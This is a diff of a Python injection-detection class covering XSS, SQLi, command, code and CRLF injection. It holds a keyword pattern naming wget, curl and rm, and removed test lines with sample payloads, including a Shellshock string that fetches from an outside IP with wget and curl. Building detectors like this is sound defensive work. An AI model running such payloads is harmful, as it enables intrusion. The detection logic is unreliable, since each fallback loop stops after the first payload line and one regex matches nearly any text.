@@ -1,4 +1,5 @@
 import re
+import decoding
 class detection:
     result={"data":[]}
     def ldap_detector(self,s):
@@ -17,7 +18,12 @@ class detection:
         if regexp.search(s):
             return True
         else:
-            return False
+            with open("payloads/CRLF injection.txt", "r", encoding="utf-8") as file:
+                for i in file.readlines():
+                    if s == decoding.decode().autodecoder(i.strip()) :
+                        return True
+                    else:
+                        return False
 
     def command_detector(self,s):
         str="'\&|\||\`|\$()|\/bin|chmod|ls|chown|grep|alias|pwd|cd|sudo|rm|mv|mkdir|touch|;|\./|htop|ps|apt|pacman|yum|kill|wget|exec|/usr|c:\\|curl'gmi"
@@ -26,10 +32,15 @@ class detection:
         if regexp.search(s):
             return True
         else:
-            return False
-
+            with open("payloads/command injection.txt", "r", encoding="utf-8") as file:
+                for i in file.readlines():
+                    if s == decoding.decode().autodecoder(i.strip()):
+                        return True
+                    else:
+                        return False
+            
     def code_detector(self,s):
-        str=""
+        str="[|]|\{|\}|\(\)|\;|\?|\.|\,|\\|\^|\$|\'|abstrac|and|as|break|callable|case|catch|class|clone|const|continue|declare|default|do|echo|else|elseif|empty|enddeclare|endfor|endforeach|endif|endswitch|extends|final|finally|fn|for|foreach|function|global|goto</td>|if|implements|include|include_once|instanceof|insteadof|interface|isset|list|namespace|new|or|print|private|protected|public|require|require_once|return|static|switch|throw|trait|try|unset|use|var|while|xor|yield|yield from"
 
         regexp = re.compile(str)
         if regexp.search(s):
@@ -44,7 +55,12 @@ class detection:
         if regexp.search(s):
             return True
         else:
-            return False
+            with open("payloads\sql injection\detect\Generic_ErrorBased.txt", "r", encoding="utf-8") as file:
+                for i in file.readlines():
+                    if s == decoding.decode().autodecoder(i.strip()):
+                        return True
+                    else:
+                        return False
 
     def xss_detector(self,s):
         str = ("<[^\\w<>]*(?:[^<>\""
@@ -225,18 +241,22 @@ class detection:
         if regexp.search(s):
             return True
         else:
-            return False
+            with open("payloads/xss.txt", "r", encoding="utf-8") as file:
+                for i in file.readlines():
+                    if s == decoding.decode().autodecoder(i.strip()):
+                        return True
+                    else:
+                        return False
     def classifier(self,json):
         for i in json:
             if self.xss_detector(json[i]):
                 self.result["data"].append({i:json[i],"attacktype":"XSS"})
             elif self.sqli_detector(json[i]):
                 self.result["data"].append({i:json[i],"attacktype":"sqli"})
+            elif self.command_detector(json[i]):
+                self.result["data"].append({i:json[i],"attacktype":"command injection"})
+            elif self.code_detector(json[i]):
+                self.result["data"].append({i:json[i],"attacktype":"code injection"})
+            elif self.crlf_detector(json[i]):
+                self.result["data"].append({i:json[i],"attacktype":"crlf injaction"})
         return self.result
-
-
-a=detection()
-print(a.xss_detector("ABC<div style=\"x:expression\x5C(javascript:alert(1)\">DEF"))
-print(a.sqli_detector("AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))"))
-print(a.crlf_detector("\r\n Header-Test:BLATRUC"))
-print(a.command_detector("() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\");'"))
